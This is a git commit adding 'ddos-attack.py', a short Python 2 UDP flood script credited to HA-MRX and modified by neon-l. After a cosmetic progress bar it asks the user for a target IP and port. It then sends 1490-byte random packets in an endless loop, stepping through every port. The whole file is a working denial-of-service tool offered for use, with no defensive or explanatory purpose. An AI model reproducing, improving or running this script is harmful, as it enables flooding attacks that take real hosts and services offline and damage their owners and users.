17d1d9d8fb9ba0541bb07a1cbad5744136a3c6bc
neon-l <57247635+neon-l@users.noreply.github.com>
2019-11-01 13:36:25 +0630

    Add files via upload

---
+++ ddos-attack.py
@@ -0,0 +1,52 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : HA-MRX"
+print "Modded by:  neon-l"
+print "You Tube : https://www.youtube.com/c/HA-MRX"
+print "github   : https://github.com/Ha3MrX"
+print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print
+ip = raw_input("Your Target IP : ")
+port = input("Target Port      : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(1)
+print "[=====               ] 25%"
+time.sleep(1)
+print "[==========          ] 50%"
+time.sleep(1)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(1)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
